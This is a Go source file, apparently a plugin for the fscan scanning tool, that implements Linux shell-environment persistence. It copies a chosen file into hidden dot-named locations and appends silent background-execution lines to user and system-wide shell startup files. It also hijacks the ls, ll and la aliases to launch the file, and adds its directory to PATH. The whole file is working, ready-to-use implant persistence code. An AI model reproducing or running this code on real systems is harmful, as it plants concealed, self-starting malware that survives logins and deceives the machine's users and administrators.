//go:build (plugin_shellenv || !plugin_selective) && linux && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// ShellEnvPlugin Shell环境持久化插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现持久化功能
// - 保持原有功能逻辑
type ShellEnvPlugin struct {
	plugins.BasePlugin
}

// NewShellEnvPlugin 创建Shell环境变量持久化插件
func NewShellEnvPlugin() *ShellEnvPlugin {
	return &ShellEnvPlugin{
		BasePlugin: plugins.NewBasePlugin("shellenv"),
	}
}

// Scan 执行Shell环境变量持久化 - 直接实现
func (p *ShellEnvPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	var output strings.Builder

	if runtime.GOOS != "linux" {
		output.WriteString("Shell环境变量持久化只支持Linux平台\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("不支持的平台: %s", runtime.GOOS),
		}
	}

	// 从config获取配置
	targetFile := config.PersistenceTargetFile
	if targetFile == "" {
		output.WriteString("必须通过 -persistence-file 参数指定目标文件路径\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("未指定目标文件"),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(targetFile); os.IsNotExist(err) {
		output.WriteString(fmt.Sprintf("目标文件不存在: %s\n", targetFile))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString("=== Shell环境变量持久化 ===\n")
	output.WriteString(fmt.Sprintf("目标文件: %s\n", targetFile))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	var successCount int

	// 1. 复制文件到隐藏目录
	hiddenPath, err := p.copyToHiddenPath(targetFile)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 复制文件失败: %v\n", err))
	} else {
		output.WriteString(fmt.Sprintf("✓ 文件已复制到: %s\n", hiddenPath))
		successCount++
	}

	// 2. 添加到用户shell配置文件
	userConfigs, err := p.addToUserConfigs(hiddenPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加到用户配置失败: %v\n", err))
	} else {
		output.WriteString(fmt.Sprintf("✓ 已添加到用户配置: %s\n", strings.Join(userConfigs, ", ")))
		successCount++
	}

	// 3. 添加到全局shell配置文件
	globalConfigs, err := p.addToGlobalConfigs(hiddenPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加到全局配置失败: %v\n", err))
	} else {
		output.WriteString(fmt.Sprintf("✓ 已添加到全局配置: %s\n", strings.Join(globalConfigs, ", ")))
		successCount++
	}

	// 4. 创建启动别名
	aliasConfigs, err := p.addAliases(hiddenPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 创建别名失败: %v\n", err))
	} else {
		output.WriteString(fmt.Sprintf("✓ 已创建别名: %s\n", strings.Join(aliasConfigs, ", ")))
		successCount++
	}

	// 5. 添加PATH环境变量
	err = p.addToPath(filepath.Dir(hiddenPath))
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加PATH失败: %v\n", err))
	} else {
		output.WriteString("✓ 已添加到PATH环境变量\n")
		successCount++
	}

	// 输出统计
	output.WriteString(fmt.Sprintf("\nShell环境变量持久化完成: 成功(%d) 总计(%d)\n", successCount, 5))

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("shellenv_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Output:  output.String(),
		Error:   nil,
	}
}

// copyToHiddenPath 复制文件到隐藏目录
func (p *ShellEnvPlugin) copyToHiddenPath(targetFile string) (string, error) {
	// 获取用户主目录
	usr, err := user.Current()
	if err != nil {
		return "", err
	}

	// 创建隐藏目录
	hiddenDirs := []string{
		filepath.Join(usr.HomeDir, ".local", "bin"),
		filepath.Join(usr.HomeDir, ".config"),
		"/tmp/.system",
		"/var/tmp/.cache",
	}

	var targetDir string
	for _, dir := range hiddenDirs {
		if mkdirErr := os.MkdirAll(dir, 0755); mkdirErr == nil {
			targetDir = dir
			break
		}
	}

	if targetDir == "" {
		return "", fmt.Errorf("无法创建目标目录")
	}

	// 生成隐藏文件名
	basename := filepath.Base(targetFile)
	hiddenName := "." + strings.TrimSuffix(basename, filepath.Ext(basename))
	if p.isScriptFile(targetFile) {
		hiddenName += ".sh"
	}

	targetPath := filepath.Join(targetDir, hiddenName)

	// 复制文件
	err = p.copyFile(targetFile, targetPath)
	if err != nil {
		return "", err
	}

	// 设置执行权限
	_ = os.Chmod(targetPath, 0755)

	return targetPath, nil
}

// copyFile 复制文件内容
func (p *ShellEnvPlugin) copyFile(src, dst string) error {
	sourceData, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, sourceData, 0755)
}

// addToUserConfigs 添加到用户shell配置文件
func (p *ShellEnvPlugin) addToUserConfigs(execPath string) ([]string, error) {
	usr, err := user.Current()
	if err != nil {
		return nil, err
	}

	configFiles := []string{
		filepath.Join(usr.HomeDir, ".bashrc"),
		filepath.Join(usr.HomeDir, ".profile"),
		filepath.Join(usr.HomeDir, ".bash_profile"),
		filepath.Join(usr.HomeDir, ".zshrc"),
	}

	var modified []string
	execLine := p.generateExecLine(execPath)

	for _, configFile := range configFiles {
		if p.addToConfigFile(configFile, execLine) {
			modified = append(modified, configFile)
		}
	}

	if len(modified) == 0 {
		return nil, fmt.Errorf("无法修改任何用户配置文件")
	}

	return modified, nil
}

// addToGlobalConfigs 添加到全局shell配置文件
func (p *ShellEnvPlugin) addToGlobalConfigs(execPath string) ([]string, error) {
	configFiles := []string{
		"/etc/bash.bashrc",
		"/etc/profile",
		"/etc/zsh/zshrc",
		"/etc/profile.d/custom.sh",
	}

	var modified []string
	execLine := p.generateExecLine(execPath)

	for _, configFile := range configFiles {
		// 对于profile.d，需要先创建目录
		if strings.Contains(configFile, "profile.d") {
			_ = os.MkdirAll(filepath.Dir(configFile), 0755)
		}

		if p.addToConfigFile(configFile, execLine) {
			modified = append(modified, configFile)
		}
	}

	if len(modified) == 0 {
		return nil, fmt.Errorf("无法修改任何全局配置文件")
	}

	return modified, nil
}

// addAliases 添加命令别名
func (p *ShellEnvPlugin) addAliases(execPath string) ([]string, error) {
	usr, err := user.Current()
	if err != nil {
		return nil, err
	}

	aliasFiles := []string{
		filepath.Join(usr.HomeDir, ".bash_aliases"),
		filepath.Join(usr.HomeDir, ".aliases"),
	}

	// 生成常用命令别名
	aliases := []string{
		fmt.Sprintf("alias ls='%s; /bin/ls'", execPath),
		fmt.Sprintf("alias ll='%s; /bin/ls -l'", execPath),
		fmt.Sprintf("alias la='%s; /bin/ls -la'", execPath),
	}

	var modified []string
	for _, aliasFile := range aliasFiles {
		content := strings.Join(aliases, "\n") + "\n"
		if p.addToConfigFile(aliasFile, content) {
			modified = append(modified, aliasFile)
		}
	}

	return modified, nil
}

// addToPath 添加到PATH环境变量
func (p *ShellEnvPlugin) addToPath(dirPath string) error {
	usr, err := user.Current()
	if err != nil {
		return err
	}

	configFile := filepath.Join(usr.HomeDir, ".bashrc")
	pathLine := fmt.Sprintf("export PATH=\"%s:$PATH\"", dirPath)

	if p.addToConfigFile(configFile, pathLine) {
		return nil
	}

	return fmt.Errorf("无法添加PATH环境变量")
}

// addToConfigFile 添加内容到配置文件
func (p *ShellEnvPlugin) addToConfigFile(configFile, content string) bool {
	// 读取现有内容
	existingContent := ""
	if data, err := os.ReadFile(configFile); err == nil {
		existingContent = string(data)
	}

	// 检查是否已存在
	if strings.Contains(existingContent, content) {
		return true // 已存在，视为成功
	}

	// 添加新内容
	if !strings.HasSuffix(existingContent, "\n") && existingContent != "" {
		existingContent += "\n"
	}
	existingContent += content + "\n"

	// 写入文件
	return os.WriteFile(configFile, []byte(existingContent), 0644) == nil
}

// generateExecLine 生成执行命令行
func (p *ShellEnvPlugin) generateExecLine(execPath string) string {
	if p.isScriptFile(execPath) {
		return fmt.Sprintf("bash %s >/dev/null 2>&1 &", execPath)
	}
	return fmt.Sprintf("%s >/dev/null 2>&1 &", execPath)
}

// isScriptFile 检查是否为脚本文件
func (p *ShellEnvPlugin) isScriptFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return ext == ".sh" || ext == ".bash" || ext == ".zsh"
}

// 注册插件
func init() {
	RegisterLocalPlugin("shellenv", func() Plugin {
		return NewShellEnvPlugin()
	})
}
